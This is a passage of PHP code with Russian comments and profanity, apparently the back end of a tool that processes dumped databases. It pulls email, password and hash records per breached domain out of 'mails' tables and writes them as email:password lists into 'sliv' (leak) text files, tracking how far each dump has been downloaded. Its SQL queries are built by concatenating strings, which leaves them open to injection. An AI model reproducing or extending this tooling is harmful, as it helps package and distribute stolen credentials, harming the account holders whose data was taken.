		{
			
			$data0tmp = $this->Filed->query("select * FROM `renders` WHERE  `statusNoHash` = 2 AND `statusHash` = 2 AND `statusMail` = 2 AND `countMail` > 10000");
			
			//лог
			$this->d("select * FROM `renders` WHERE  `statusNoHash` = 2 AND `statusHash` = 2 AND `statusMail` = 2 AND `countMail` > 10000");
			$this->d($data0tmp,'$data0tmp');
		}
		
		
		//exit;
		
		foreach($data0tmp as $d)
		{
			
			$this->d($d);
			//exit;
			$domen		=  $d['renders']['domen'];
			$countHash =   $d['renders']['countHash']; 			
			$countMail  =  $d['renders']['countMail'];
			$countNoHash = $d['renders']['countNoHash'];
			
			$country =     $d['renders']['country'];
			$category =    $d['renders']['category'];
			$download =    $d['renders']['download'];
			$randPass =    $d['renders']['randPass'];
			
			$lastCountHash =   $d['renders']['lastCountHash'];
			$lastCountNoHash = $d['renders']['lastCountNoHash'];
			$lastCountMail =   $d['renders']['lastCountMail'];
			$statusNoHash =    $d['renders']['statusNoHash'];
			$statusHash =      $d['renders']['statusHash'];
			$statusMail =      $d['renders']['statusMail'];
			
			$z = $domen; 

			$data1tmp = $this->Filed->query("SELECT count(domen)  FROM  `mails` WHERE `domen` ='{$domen}' GROUP BY `domen` order by count(domen) DESC limit 0,1");
			
			
			$raz = $data1tmp[0][0]['count(domen)'] - $countMail;
			
			$this->d($raz,'raz');
			$this->d($data1tmp[0][0]['count(domen)'],'$countMail _NEW!!');
			$this->d($countMail,'countMail_OLD');
			
			if($raz > $this->raz)
			{
				
				//////ВЫБОРКИ НУЖНЫЕ//////////////
				$p[$z]['randPass'] = $this->Filed->query("SELECT `pass` FROM  `mails` WHERE `domen` = '{$z}' AND pass !='0' order by rand() limit 3");
				
				$p[$z]['country'] = $this->Filed->query("SELECT `country` FROM  `fileds` WHERE  `post_id` = (select id from `posts` WHERE `domen` = '$domen' limit 0,1) limit 0,1");
				
				$p[$z]['category'] = $this->Filed->query("SELECT `category` FROM  `fileds` WHERE  `post_id` = (select id from `posts` WHERE `domen` = '$domen' limit 0,1) limit 0,1");
				
				$p[$z]['post_id'] = $this->Filed->query("SELECT `post_id` FROM  `fileds` WHERE  `post_id` = (select id from `posts` WHERE `domen` = '$domen' limit 0,1) limit 0,1");
				
				$p[$z]['date'] = $this->Filed->query("SELECT date FROM  `mails` WHERE `domen` = '{$z}' group by date limit 0,1");
				

				$p[$z]['post_id'] =  $p[$z]['post_id'][0]['fileds']['post_id'];
				$p[$z]['category'] = $p[$z]['category'][0]['fileds']['category'];
				$p[$z]['country'] = $p[$z]['country'][0]['fileds']['country'];
				$p[$z]['date'] = $p[$z]['date'][0]['mails']['date'];
				
				if($p[$z]['category'] == '')$p[$z]['category'] = '0';
				if($p[$z]['country'] == '')$p[$z]['country'] = '0';
				if($p[$z]['post_id'] == '')$p[$z]['post_id'] = '0';
				$p[$z]['category'] = str_replace('/','-',$p[$z]['category']);
				/////////////////////////////////////////
				
				
				
				
				////////в кучу пассы собираем////////////
				$strPassTmp = '';
				
				foreach($p[$z]['randPass'] as $passTmp0){	
					$strPassTmp .=$passTmp0['mails']['pass']."<br>";
				}
				$p[$z]['randPass'] = $strPassTmp;
				/////////////////////////////////////
				

				
				
				///// расчитываем количество мыл, если дохуя записей в базе данных/////
				$countAll = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE `domen` = '{$z}' ");
				$countAll = $countAll[0][0]['count(*)'];
				/////////////////////////////////////
				
				
				////БЛОК ПОДСЧЁТА ХЭШЕЙ НОВОЕ ЗНАЧЕНИЕ//////////
				$counthash2  = $this->Filed->query("SELECT count(pass) FROM  `mails` WHERE `domen` = '$domen' AND `hashtype` !='0' AND `pass` !='0'");
				$countNoHash2 = $this->Filed->query("SELECT count(pass) FROM  `mails` WHERE `domen` = '$domen' AND `hashtype` ='0' AND `pass` !='0'");
				
				$p[$z]['countHash'] = $counthash2[0][0]['count(pass)'];
				$p[$z]['countNoHash'] = $countNoHash2[0][0]['count(pass)'];
				
				$this->d($p[$z]['countHash'],'countHash_NEW!!');
				$this->d($countHash,'countHash_OLD!!');
				$this->d($p[$z]['countNoHash'],'countNoHash_NEW!!');
				$this->d($countNoHash,'countNoHash_OLD!!');
				////////////////////////////////////////////
				
				
				//////// БЛОК с пассами КОЛИЧЕСТВО///////////
				$count1  = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE `domen` = '$domen' AND pass !='0'");
				$p[$z]['countPass'] = $count1[0][0]['count(*)'];
				$this->d($p[$z]['countPass'],'countPass_NEW!!');
				///////////////////////////////////////////////
				
				
				
				//////// БЛОК ПРОСТО EMAILS КОЛИЧЕСТВО///////////
				$count2 = $data = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE domen = '$domen'");
				$p[$z]['countMail'] = $count2[0][0]['count(*)'];
				$this->d($p[$z]['countMail'],'countMail_NEW!!');
				/////////////////////////////////////////////////
				
				
				//////// БЛОК ОСТАТКА БЕЗ ПАССОВ///////////
				$count3 = $data = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE domen = '$domen' AND pass='0'");
				$p[$z]['countMailnoPass'] = $count3[0][0]['count(*)'];
				$this->d($p[$z]['countMailnoPass'],'countMailnoPass_NEW!!');
				/////////////////////////////////////////////////
				
				
				
				///Делаем название у файла/////////
				$all ='';
				
				$all .= $domen;
				
				if($p[$z]['countPass'] >= 1){
					//$all .= '//ALLcountPASS_'.$p[$z]['countPass'];	
				}
				
				
				
				$all = "/slivpass/".$all.'.txt';
				$this->d($all,'all');
				/////////////////////////////////////
				//exit;
				
				///если записей мало, то просто в файл сохранаяем///////
				if($countAll < $this->lim2)
				{
					echo 'countAll <'.$this->lim2.'<br>';
					$fh = fopen('.'.$all, "w+");
					
					if($fh){
						$this->d('$all - otkrit KAK NOVYI FILE');
					}
					
					$limitYes = false;
					//////// БЛОК с пассами без хешей///////////
					
					$data0 = $this->Filed->query("SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE `domen` = '$z' AND `pass` !='0' AND hashtype ='0'" );

					$z0 = '';
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}
					//////////////////////////////////		
					$stop = $this->get_time();
					$this->d($stop - $start,'countNoHASH');
					//запись в файл
					
					//////// БЛОК с пассами///////////
					
					$data1 = $this->Filed->query("SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE domen = '$z' AND pass !='0' AND hashtype !='0' ");

					$z1 = '';
					
					foreach($data1 as $d)
					{
						$z1 .= $d['mails']['email'];
						$z1 .= ":";
						$z1 .= $d['mails']['pass'];
						$z1 .= "\r\n";

					}
					
					///////////////////////////////////
					$stop1 = $this->get_time();
					$this->d($stop1 - $start,'countHash');
					

					////////БЛОК без пассов///////////
					
					
					$data2 = $this->Filed->query("SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE `domen` = '$z' AND `pass` ='0'");
					$stop =  $this->get_time();
					
					$z2 = '';
					
					foreach($data2 as $d2)
					{
						$z2 .= $d2['mails']['email'];
						$z2 .= "\r\n";
						
					}
					$stop2 = $this->get_time();
					$this->d($stop2 - $start,'MAIL');
					
					
					
				}else//если больше чем lim тогда будем бить файл
				{
					echo 'countAll >'.$this->lim2.'<br>';
					$fh = fopen('.'.$download, "a+");
					
					if($fh){
						$this->d('$all - otkrit na dokachku');
					}
					
					$limitYes = true;
					
					
					
					//у нас данные сохраняются по порядку без паролей, хэши и просто мыла

					
					//////// БЛОК с пассами без хешей///////////
					
					
					if($p[$z]['countNoHash'] > $countNoHash)
					{
						$ht = "pass !='0' AND hashtype ='0'"; 
						echo 'Dokachka lastCountNoHash<br>';
						//расчёт сколько дампить надо по записям без пассов
						if(($p[$z]['countNoHash']-$lastCountNoHash) > $this->lim){
							
							$limitNoHash = $this->lim;
							
						}else{
							
							$limitNoHash = $p[$z]['countNoHash']-$lastCountNoHash;
							
						}
						
						
						$data0 = $this->Filed->query("SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE `domen` = '$z' AND {$ht} limit {$lastCountNoHash},{$limitNoHash}" );
						
						$this->d("SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE `domen` = '$z' AND {$ht} limit {$lastCountNoHash},{$limitNoHash}");
						
						$z0 = '';
						
						foreach($data0 as $d)
						{
							$z0 .= $d['mails']['email'];
							$z0 .= ":";
							$z0 .= $d['mails']['pass'];
							$z0 .= "\r\n";

						}
						$next = $lastCountNoHash+$limitNoHash;

						$this->Post->query("UPDATE `renders` SET 
						`lastCountNoHash`=$next
						WHERE `domen` = '{$domen}'");
						
						$stop = $this->get_time();
						echo $stop - $start;
						//$this->d($z0,'z0');
					}
					
					//////////////////////////////////	
					
					
					//////////////////////////////////
					$this->d(1);
					$this->d($limitNoHash,'limitNoHash');
					$this->d($lastCountNoHash,'lastCountNoHash');
					
					//exit;
					//////// БЛОК с пассами c ХЭШАМИ///////////
					
					if($p[$z]['countHash'] > $countHash)
					{
						$ht = "`pass` !='0' AND `hashtype` !='0'"; 
						
						echo 'Dokachka lastCountHash<br>';
						//расчёт сколько дампить надо по записям без пассов
						if(($p[$z]['countHash']-$lastCountHash) > $this->lim){
							$limitHash = $this->lim;
						}else{
							$limitHash = $p[$z]['countHash']-$lastCountHash;	
						}
						
						
						$data1 = $this->Filed->query("SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE `domen` = '$z' AND {$ht} limit {$lastCountHash},{$limitHash}" );
						
						$this->d("SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE `domen` = '$z' AND {$ht} limit {$lastCountHash},{$limitHash}");
						
						$z1 = '';
						
						foreach($data1 as $d)
						{
							$z1 .= $d['mails']['email'];
							$z1 .= ":";
							$z1 .= $d['mails']['pass'];
							$z1 .= "\r\n";

						}

						$next = $lastCountHash+$limitHash;
						
						$this->Post->query("UPDATE `renders` SET 
						`lastCountHash`=$next
						WHERE `domen` = '{$domen}'");
						
						$stop = $this->get_time();
						echo $stop - $start;
						//$this->d($z1,'z1');
						//exit;
					}
					
					//////////////////////////////////	
					$this->d(2);		
					$this->d($limitHash,'limitHash');
					$this->d($lastCountHash,'lastCountHash');
					
					//exit;
					////////БЛОК без пассов///////////

					
					if($p[$z]['countMail'] > $countMail)
					{
						$ht = "pass ='0'"; 
						echo 'Dokachka lastCountMail<br>';
						//расчёт сколько дампить надо по записям без пассов
						if(($p[$z]['countMailnoPass']-$lastCountMail) > $this->lim){
							$limitMail = $this->lim;	
						}else{
							$limitMail = $p[$z]['countMailnoPass']-$lastCountMail;
						}
						
						
						$data2 = $this->Filed->query("SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE `domen` = '$z' AND {$ht} limit {$lastCountMail},{$limitMail}" );
						
						$this->d("SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE `domen` = '$z' AND {$ht} limit {$lastCountMail},{$limitMail}");
						
						$z2 = '';
						
						foreach($data2 as $d)
						{
							$z2 .= $d['mails']['email'];
							$z2 .= "\r\n";
						}

						$next = $lastCountMail+$limitMail;
						
						$this->Post->query("UPDATE `renders` SET 
						`lastCountMail`=$next
						WHERE `domen` = '{$domen}'");
						
						$stop = $this->get_time();
						echo $stop - $start;
						//$this->d($z2,'z2');
						//exit;
					}

					
					$this->d(3);
					$this->d($limitMail,'limitMail');
					$this->d($lastCountMail,'lastCountMail');
					
				}
				
				$str = $z0.$z1.$z2;
				
				//$this->d($str);
				

				$this->Post->query('UPDATE `renders` SET 
				`countMail`='.$p[$z]['countMail'].',
				`countPass`='.$p[$z]['countPass'].',
				`countHash`='.$p[$z]['countHash'].',
				`countNoHash`='.$p[$z]['countNoHash'].',
				`download`="'.$all.'" 
				WHERE `domen`="'.$domen.'" ');
				
				
				
				//запись в файл
				fwrite($fh, $str);
				fclose($fh);
				
				$this->d($download,'staryi');
				$this->d($all,'novyi');
				
				if(file_exists('.'.$all) AND $limitYes != true){
					@unlink('.'.$download);
					echo '.'.$download.'<br>';
					
				}
				
				
				
				
				if($limitYes == TRUE AND file_exists('.'.$all)){
					$this->d('limitYes = yes - pereimenovivaem');
					
					@rename('.'.$download,'.'.$all);	
				}
				
				
			}
		}
		
		$stop =  $this->get_time();
		
		
		$this->d($stop - $start,'END');
		
		$this->stop();
		
		die;
		
	}
	
	
	function rendown_one(){//функция для фоного скачивания баз и записи в отдельную таблицу и в файл ОСНОВНАЯ
		
		//echo '<pre>';
		//print_r($this->params);
		//echo '</pre>';
		$this->timeStart = $this->start('rendown_one',1);	
		//exit;
		
		$this->s();//замер времени
	
		
		
		$str1 = '';
		$str11 = '';
		$str12 = '';
		
		
		
		//епать хитрая хуйня получилась, она нужна для того чтобы отсеять во время скачки в файл те домены, которые в данный момент дампяться в fileds get = 1
		
		
		//////НАХОДИМ КАКИЕ НЕ НАДО ПОКА ЧТО СКАЧИВАТЬ В ФАЙЛ НИЖЕ//////////////////////
		$data10tmp = $this->Filed->query("select `post_id` FROM `fileds` WHERE `get` ='1'  AND `password` =':' GROUP BY `post_id`");
		
		//логирование
		$this->d("select post_id FROM `fileds` WHERE `get`='1'  AND `password` =':' GROUP BY post_id");
		$this->d($data10tmp,'НАХОДИМ КАКИЕ НЕ НАДО ПОКА ЧТО СКАЧИВАТЬ В ФАЙЛ НИЖЕ');
		
		$i10 = 0;
		//перебираем все наши такие post_id и определяем какой домен у post_id
		foreach ($data10tmp as $tmp10)
		{
			$k = trim($tmp10['fileds']['post_id']);
			$str11 .=" `post_id` !='{$k}' AND";
			//по post_id вытаскиывает url и по нему уже host определяем
			$data11tmp = $this->Filed->query("select `url` FROM `posts` WHERE `id`={$k}");
			$this->d($data11tmp,'$data11tmp host iz posts');
			$data11tmp[0]['posts']['url'] = str_replace('http://','',$data11tmp[0]['posts']['url']);
			$data11tmp[0]['posts']['url'] = 'http://'.$data11tmp[0]['posts']['url'];
			
			$url = parse_url($data11tmp[0]['posts']['url']);
			$str12 .=" `domen` !='".$url['host']."' AND";
			$i10++;
		}
		
		if($i10 !=1)$str11 =substr($str11, 0, strlen($str11)-3);//если несколько убираем AND в конце
		$str12 =substr($str12, 0, strlen($str12)-3);//убираем AND в конце
		
		//лог
		$this->d($str11,'$str11');
		$this->d($str12,'$str12');
		
		//////////////////////////////////////////////////////////////////////////////////	
		
		////////////////сначала выбираем те базы которые со статусом = 3//////////////////
		$data0tmp = $this->Filed->query("select * FROM `renders_one`  WHERE {$str11} `statusMail` = 3 limit 1");
		
		//лог
		$this->d("select * FROM `renders_one` WHERE {$str11} `statusMail` = 3 limit 1");
		$this->d($data0tmp,'data0tmp - STATUS 3');
		///////////////////
		

		//если есть не докачанные базы
		if($data0tmp[0]['renders_one']['id'] != 0)
		{
			
			echo '!!!!!!!!est status 3!!!!!!!!<br>';
			
			
			//////ФОРМИРУЕМ КАКИЕ ВЫБИРАТЬСЯ НЕ ДОЛЖНЫ, ПОТОМУ ЧТО ОНИ УЖЕ ЕСТЬ В RENDERS/////////////
			foreach ($data0tmp as $tmp0)
			{
				$k = trim($tmp0['renders_one']['domen']);
				$str1 .=" `domen` !='{$k}' AND";		
			}
			
			
			$str1 =substr($str1, 0, strlen($str1)-3);
			
			if(strlen($str1) > 3){
				$str1 = 'WHERE '.$str1;
			}else{
				$str1 = '';
			}
			$dok = true;
			
			
		}else
		{//качаем базы с нуля
			echo '!!!!!!!!!rabotaem po status 2!!!!!!!!!!!!<br>';
			
			$dok = false;
			//начинаем скачивать в файл новые базы, даже при get == 1
			$data0tmp = $this->Filed->query("select * FROM `renders_one` WHERE `statusMail` = 2");
			
			$this->d($data0tmp,'data0tmp - STATUS 2');
			
			$str1 = '';
			
			//////ФОРМИРУЕМ КАКИЕ ВЫБИРАТЬСЯ НЕ ДОЛЖНЫ, ПОТОМУ ЧТО ОНИ УЖЕ ЕСТЬ В RENDERS/////////////
			foreach ($data0tmp as $tmp0)
			{
				$k = trim($tmp0['renders_one']['domen']);
				$str1 .=" `domen` !='{$k}' AND";		
			}
			
			$str1 =substr($str1, 0, strlen($str1)-3);
			
			if(strlen($str1) > 3)
			{
				$str1 = 'WHERE '.$str1;
			}else{
				$str1 = '';
			}
			
		}
		$this->d($str1,'str1 STATUS 2');
		
		///////Выборка из таблицы с мылами на нашими условиями/////////////
		if($str12 !='')
		{
			if(strlen($str1) > 3){
				$str1 = $str1.' AND ';
				$str2 = "SELECT `domen`  FROM  `mails_one` {$str1} {$str12} GROUP BY `domen` order by count(domen) DESC limit 0,1";
			}else{
				$str2 = "SELECT `domen`  FROM  `mails_one` WHERE {$str12} GROUP BY `domen` order by count(domen) DESC limit 0,1";
				
			}
			
		}else
		{
			$str2 = "SELECT `domen`  FROM  `mails_one` {$str1} GROUP BY `domen` order by count(domen) DESC limit 0,1";
		}
		
		$data1tmp = $this->Filed->query($str2);
		
		///////Logs////////////
		$this->d($str1,'str1');
		$this->d($str2,'str2');
		$this->d($data1tmp,'$data1tmp');
		$this->p('pred_viborka');
		flush();
		
		////////////////////////////////////////////////
		$p  = array();		
		
		foreach ($data1tmp as $d)
		{

			
			$z = $d['mails_one']['domen'];
			$domen = $z;

			
			$p[$z]['country'] = $this->Filed->query("SELECT `country` FROM  `fileds` WHERE  `post_id` = (select `id` from `posts` WHERE `domen`= '$domen' limit 0,1) limit 0,1");
			
			$p[$z]['category'] = $this->Filed->query("SELECT `category` FROM  `fileds` WHERE  `post_id` = (select `id` from `posts` WHERE `domen`= '$domen' limit 0,1) limit 0,1");
			
			$p[$z]['post_id'] = $this->Filed->query("select `id` FROM `posts` WHERE `domen` = '$domen' limit 0,1");
			$this->d($p[$z]['post_id'], '$p[$z][post_id] ');
			
			$this->d("select `id` FROM `posts` WHERE `domen` = '$domen' limit 0,1");
			
			$p[$z]['date'] = $this->Filed->query("SELECT `date` FROM  `mails_one` WHERE `domen` = '{$z}' group by `date` limit 0,1");
			
			

			$p[$z]['post_id'] =  $p[$z]['post_id'][0]['posts']['id'];
			$p[$z]['category'] = $p[$z]['category'][0]['fileds']['category'];
			$p[$z]['country'] = $p[$z]['country'][0]['fileds']['country'];
			$p[$z]['date'] = $p[$z]['date'][0]['mails_one']['date'];
			
			if($p[$z]['category'] == '')$p[$z]['category'] = '0';
			if($p[$z]['country'] == '')$p[$z]['country'] = '0';
			//if($p[$z]['post_id'] == '')$p[$z]['post_id'] = 0;
			$p[$z]['category'] = str_replace('/','-',$p[$z]['category']);
			/////////////////////////////////////////
			

			$this->d($p,'pppppppppppppppppppp');
			
			
			///// расчитываем количество мыл, если дохуя записей в базе данных/////
			$countAll = $this->Filed->query("SELECT count(*) FROM  `mails_one` WHERE `domen` = '{$z}' ");
			$countAll = $countAll[0][0]['count(*)'];
			$this->d($countAll,'$countAll');
			/////////////////////////////////////
			
			
			if($countAll < $this->delete AND $countAll !=0)
			{
				$this->Filed->query("DELETE FROM `mails_one` WHERE `domen` = '$z'");
				$this->d($z,'DELETE iz vtoroy proverki');
				$this->logs('DELETE '.$z.' udalen iz mails < '.$this->delete,__FUNCTION__);
			}
			
			
			

			
			//////// БЛОК ПРОСТО EMAILS КОЛИЧЕСТВО///////////
			$count2 = $data = $this->Filed->query("SELECT count(*) FROM  `mails_one` WHERE `domen` = '$domen'");
			$p[$z]['countMail'] = $count2[0][0]['count(*)'];
			$this->d($p[$z]['countMail'],'countMail!!!!!');
			/////////////////////////////////////////////////
			
			
			//////// БЛОК ОСТАТКА БЕЗ ПАССОВ///////////
			$count3 = $data = $this->Filed->query("SELECT count(*) FROM  `mails_one` WHERE `domen` = '$domen' AND `pass` ='0'");
			$p[$z]['countMailnoPass'] = $count3[0][0]['count(*)'];
			$this->d($p[$z]['countMailnoPass'],'countMailnoPass!!!!!');
			/////////////////////////////////////////////////
			$data0tmp = $this->Filed->query("SELECT * FROM  `renders_one` WHERE `domen` = '$domen'");
			//////////////////////////
			

			$lastCountMail = $data0tmp[0]['renders_one']['lastCountMail'];
			$statusMail = $data0tmp[0]['renders_one']['statusMail'];
			
			
			
			//////////////////////////

			if(!isset($lastCountMail))$lastCountMail=0;
			if(!isset($statusMail))$statusMail=2;
			//////////////////////////
			
			
			/////////////LOG//////////////////

			$this->d($lastCountMail,'$lastCountMail');
			$this->d($statusMail,'$statusMail');
			//////////////////////////////////
			flush();

			///Делаем название у файла/////////
			$all ='';
			$all .= $domen;
			
			
			
			
			$all = "/sliv/".$all.'.txt';
			$this->d($all,'all');
			
			
			/////////////////////////////////////
			$this->p('Do osnovnyh viborok');
			flush();
			
			///если записей мало, то просто в файл сохранаяем///////
			if($countAll < $this->lim2)
			{
				echo 'countAll <'.$this->lim2.'<br>';
				
				////////БЛОК без пассов///////////
				
				
				$data2 = $this->Filed->query("SELECT `zona`,`email`,`domen` FROM  `mails_one` WHERE `domen` = '$z'");
				$stop =  $this->get_time();
				
				$z2 = '';
				
				foreach($data2 as $d2)
				{
					$z2 .= $d2['mails_one']['email'];
					$z2 .= "\r\n";
					
				}
				$stop2 = $this->get_time();
				echo $stop2 - $start;
				
				
				
			}else//если больше чем lim тогда будем бить файл
			{
				
				$limitYes = true;
				
				echo 'countAll >'.$this->lim2.'<br>';
				
				
				////////БЛОК без пассов///////////

				if($dok == FALSE AND $lastCountMail == 0)//если домен нужно с нуля закачать в файл
				{
					echo 'dok == FALSE AND lastCountMail<br>';
					
					//расчёт сколько дампить надо по записям без пассов
					if($p[$z]['countMailnoPass'] > $this->lim){
						
						$limitMail = $this->lim;
						$statusMail = 3;
					}else{
						
						$limitMail = $p[$z]['countMailnoPass'];
						$statusMail = 2;
					}
					
					

					$data2 = $this->Filed->query("SELECT zona,email,domen FROM  `mails_one` WHERE `domen` = '$z'  limit 0,{$limitMail}" );
					
					$this->d("SELECT zona,email,domen FROM  `mails` WHERE `domen` = '$z'  limit 0,{$limitMail}");
					
					$z2 = '';
					
					foreach($data2 as $d)
					{
						$z2 .= $d['mails_one']['email'];
						$z2 .= "\r\n";

					}
					//////////////////////////////////
					
					//если домен требует докачки в файл
				}else
				{
					if($statusMail == 3)
					{
						$ht = "pass ='0'"; 
						echo 'Dokachka lastCountMail<br>';
						//расчёт сколько дампить надо по записям без пассов
						if(($p[$z]['countMailnoPass']-$lastCountMail) > $this->lim){
							
							$limitMail = $this->lim;
							$statusMail = 3;
						}else{
							$limitMail = $p[$z]['countMailnoPass']-$lastCountMail;
							$statusMail = 2;
						}
						
						
						$data2 = $this->Filed->query("SELECT zona,email,domen FROM  `mails_one` WHERE `domen` = '$z' limit {$lastCountMail},{$limitMail}" );
						
						$this->d("SELECT zona,email,domen FROM  `mails_one` WHERE `domen` = '$z' limit {$lastCountMail},{$limitMail}");
						
						$z2 = '';
						
						foreach($data2 as $d)
						{
							$z2 .= $d['mails_one']['email'];
							$z2 .= "\r\n";
						}

						$next = $lastCountMail+$limitMail;
						
						$this->Post->query("UPDATE `renders_one` SET 
						`statusMail`={$statusMail},
						`lastCountMail`=$next
						WHERE `domen` = '{$domen}'");
						
					}

				}
				$this->p('Mail_time');
				$this->d('3');		
				$this->d($limitMail,'limitMail');
				$this->d($statusMail,'statusMail');
				$this->d($lastCountMail,'lastCountMail');
				flush();
				
			}
			//склеиваем все полученные данные
			$str = $z0.$z1.$z2;
			
			//////запись в файл/////////////
			$fh = fopen('.'.$all, "a+");//всегда создаётся с нуля, если есть то дописываем
			fwrite($fh, $str);
			fclose($fh);
			flush();
			
			//проверка не записан ли уже домен в базу
			$fieldcount = $this->Post->query("SELECT * FROM  `renders_one` WHERE  `domen` ='{$domen}'");
			
			if(count($fieldcount)>0)continue;
			
			
			if($limitYes == TRUE){
				
				$this->d('limitYes zapis v bazu');
				
				$this->Post->query("INSERT INTO renders_one (
			`post_id`,
			`domen`,
			`countMail`,
			`download`,
			`statusMail`,
			`lastCountMail`,
			`date`,
			`category`,
			`country`) 
			
			VALUES(
			'{$p[$z][post_id]}',
			'{$domen}',
			{$p[$z][countMail]},
			'{$all}',
			{$statusMail},
			{$limitMail},
			'{$p[$z][date]}',
			'{$p[$z][category]}',
			'{$p[$z][country]}')");
				
			}else{
				
				$this->d('limit < 500000 zapis v bazu');
				
				$this->Post->query("INSERT INTO renders_one (
			`post_id`,
			`domen`,
			`countMail`,
			`download`,
			`statusMail`,
			`lastCountMail`,
			`date`,
			`category`,
			`country`) 
			
			VALUES(
			'{$p[$z][post_id]}',
			'{$domen}',
			{$p[$z][countMail]},
			'{$all}',
			2,
			0,
			'{$p[$z][date]}',
			'{$p[$z][category]}',
			'{$p[$z][country]}')");
				
				
			}

		}
		$this->p('END_TIME');
		$this->stop();
		
		die;
		
	}
	
	function rendown_one2(){//функция для докачивания локальных файлов, в фоне
		//echo '<pre>';
		//print_r($this->params);
		//echo '</pre>';
		
		$this->timeStart = $this->start('rendown_one2',1);		
		$start = $this->get_time();
		$str1 = '';
		$str11 = '';
		
		
		//докачивать будем те базы которые в данный момент дампятся тоесть status get 1
		
		$data10tmp = $this->Filed->query("select post_id FROM `fileds` WHERE get='1' GROUP BY post_id");
		
		//логирование
		$this->d("select post_id FROM `fileds` WHERE get='1' GROUP BY post_id");
		$this->d($data10tmp);
		
		$i10 = 0;
		//перебираем все наши такие post_id
		foreach ($data10tmp as $tmp10)
		{
			$k = trim($tmp10['fileds']['post_id']);
			$str11 .=" `post_id` ={$k} or";
			$i10++;
		}
		
		$str11 =substr($str11, 0, strlen($str11)-3);//если несколько убираем AND в конце
		//$str12 =substr($str12, 0, strlen($str12)-3);//убираем AND в конце
		
		
		
		//лог
		$this->d($str11,'$str11');
		
		if($str11 !=''){
			$str11 = ' AND ('.$str11.')';
			
		}
		
		$data0tmp = $this->Filed->query("select * FROM `renders_one` WHERE  `statusMail` = 2 {$str11}");
		
		//лог	
		$this->d("select * FROM `renders_one` WHERE  `statusMail` = 2 {$str11}");
		$this->d($data0tmp,'$data0tmp');	
		
		if(count($data0tmp ) == 0)
		{
			
			$data0tmp = $this->Filed->query("select * FROM `renders_one` WHERE  `statusMail` = 2 AND countMail > 10000");
			
			//лог
			$this->d("select * FROM `renders_one` WHERE  `statusMail` = 2 AND `countMail` > 10000");
			$this->d($data0tmp,'$data0tmp');
		}
		
		
		//exit;
		
		foreach($data0tmp as $d)
		{
			
			$this->d($d);
			//exit;
			$domen		=  $d['renders_one']['domen'];		
			$countMail  =  $d['renders_one']['countMail'];

			
			$country =         $d['renders_one']['country'];
			$category =   	   $d['renders_one']['category'];
			$download =   	   $d['renders_one']['download'];
			$lastCountMail =   $d['renders_one']['lastCountMail'];
			$statusMail =      $d['renders_one']['statusMail'];
			
			$z = $domen; 

			$data1tmp = $this->Filed->query("SELECT count(domen)  FROM  `mails_one` WHERE `domen` ='{$domen}' GROUP BY domen order by count(domen) DESC limit 0,1");
			
			
			$raz = $data1tmp[0][0]['count(domen)'] - $countMail;
			
			$this->d($raz,'raz');
			$this->d($data1tmp[0][0]['count(domen)'],'$countMail _NEW!!');
			$this->d($countMail,'countMail_OLD');
			
			if($raz > $this->raz)
			{
				
				//////ВЫБОРКИ НУЖНЫЕ//////////////
				
				
				$p[$z]['country'] = $this->Filed->query("SELECT `country` FROM  `fileds` WHERE  `post_id` = (select id from `posts` WHERE `domen` = '$domen' limit 0,1) limit 0,1");
				
				$p[$z]['category'] = $this->Filed->query("SELECT `category` FROM  `fileds` WHERE  `post_id` = (select id from `posts` WHERE `domen` = '$domen'' limit 0,1) limit 0,1");
				
				$p[$z]['post_id'] = $this->Filed->query("SELECT `post_id` FROM  `fileds` WHERE  `post_id` = (select id from `posts` WHERE `domen` = '$domen' limit 0,1) limit 0,1");
				
				$p[$z]['date'] = $this->Filed->query("SELECT date FROM  `mails_one` WHERE `domen` = '{$z}' group by date limit 0,1");
				

				$p[$z]['post_id'] =  $p[$z]['post_id'][0]['fileds']['post_id'];
				$p[$z]['category'] = $p[$z]['category'][0]['fileds']['category'];
				$p[$z]['country'] = $p[$z]['country'][0]['fileds']['country'];
				$p[$z]['date'] = $p[$z]['date'][0]['mails_one']['date'];
				
				if($p[$z]['category'] == '')$p[$z]['category'] = '0';
				if($p[$z]['country'] == '')$p[$z]['country'] = '0';
				if($p[$z]['post_id'] == '')$p[$z]['post_id'] = '0';
				$p[$z]['category'] = str_replace('/','-',$p[$z]['category']);
				/////////////////////////////////////////
				
				
				
				
				
				
				///// расчитываем количество мыл, если дохуя записей в базе данных/////
				$countAll = $this->Filed->query("SELECT count(*) FROM  `mails_one` WHERE `domen` = '{$z}' ");
				$countAll = $countAll[0][0]['count(*)'];
				/////////////////////////////////////
				
				$this->d($countAll,'$countAll domen v mails_one');
				
				
				
				//////// БЛОК ПРОСТО EMAILS КОЛИЧЕСТВО///////////
				$count2 = $data = $this->Filed->query("SELECT count(*) FROM  `mails_one` WHERE domen = '$domen'");
				$p[$z]['countMail'] = $count2[0][0]['count(*)'];
				$this->d($p[$z]['countMail'],'countMail_NEW!!');
				/////////////////////////////////////////////////
				
				
				//////// БЛОК ОСТАТКА БЕЗ ПАССОВ///////////
				$count3 = $data = $this->Filed->query("SELECT count(*) FROM  `mails_one` WHERE domen = '$domen' AND pass='0'");
				$p[$z]['countMailnoPass'] = $count3[0][0]['count(*)'];
				$this->d($p[$z]['countMailnoPass'],'countMailnoPass_NEW!!');
				/////////////////////////////////////////////////
				
				
				
				///Делаем название у файла/////////
				$all ='';
				
				$all .= $domen;
				
				
				
				$all = "/sliv/".$all.'.txt';
				$this->d($all,'all');
				/////////////////////////////////////
				//exit;
				
				///если записей мало, то просто в файл сохранаяем///////
				if($countAll < $this->lim2)
				{
					echo 'countAll <'.$this->lim2.'<br>';
					$fh = fopen('.'.$all, "w+");
					
					if($fh){
						$this->d('$all - otkrit KAK NOVYI FILE');
					}
					
					$limitYes = false;
					
					
					

					////////БЛОК без пассов///////////
